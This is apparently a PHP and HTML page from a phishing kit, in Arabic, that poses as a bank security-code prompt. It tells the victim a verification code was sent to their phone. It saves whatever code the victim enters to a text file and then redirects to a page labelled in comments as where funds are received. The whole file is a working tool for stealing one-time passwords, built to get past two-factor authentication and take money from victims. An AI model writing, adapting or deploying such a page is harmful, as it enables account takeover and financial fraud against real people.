<?php
$file = "otp.txt";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $otp = trim($_POST['code']);
    
    // حفظ رمز التحقق في الملف
    file_put_contents($file, "OTP: $otp\n", FILE_APPEND | LOCK_EX);
    
    // توجيه المستخدم إلى صفحة استلام الأموال
    header("Location: withdraw.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز التحقق</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f5f5; text-align: center; }
        .container { width: 300px; margin: 100px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
        h2 { color: #003366; }
        p { color: #555; font-size: 14px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; text-align: center; font-size: 16px; }
        button { background-color: #003366; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; }
        button:disabled { background-color: #999; cursor: not-allowed; }
        button:hover:not(:disabled) { background-color: #002244; }
        #timer { color: red; font-size: 16px; font-weight: bold; }
    </style>
    <script>
        let timeLeft = 30;
        function startTimer() {
            const button = document.getElementById("submitBtn");
            const timer = document.getElementById("timer");

            button.disabled = true; // تعطيل الزر في البداية

            let countdown = setInterval(function() {
                timer.innerText = timeLeft;
                timeLeft--;

                if (timeLeft < 0) {
                    clearInterval(countdown);
                    timer.innerText = ""; // إخفاء المؤقت بعد انتهائه
                    button.disabled = false; // تفعيل الزر بعد 30 ثانية
                }
            }, 1000);
        }

        window.onload = startTimer;
    </script>
</head>
<body>

<div class="container">
    <h2>ادخل كود الأمان الخاص بك</h2>
    <p>تم إرسال رمز التحقق إلى رقم هاتفك عبر رسالة نصية. يرجى إدخال الرمز المرسل خلال <span id="timer">30</span> ثانية.</p>
    <form method="post">
        <input type="text" name="code" placeholder="رمز الأمان" required>
        <button type="submit" id="submitBtn">تحقق</button>
    </form>
</div>

</body>
</html>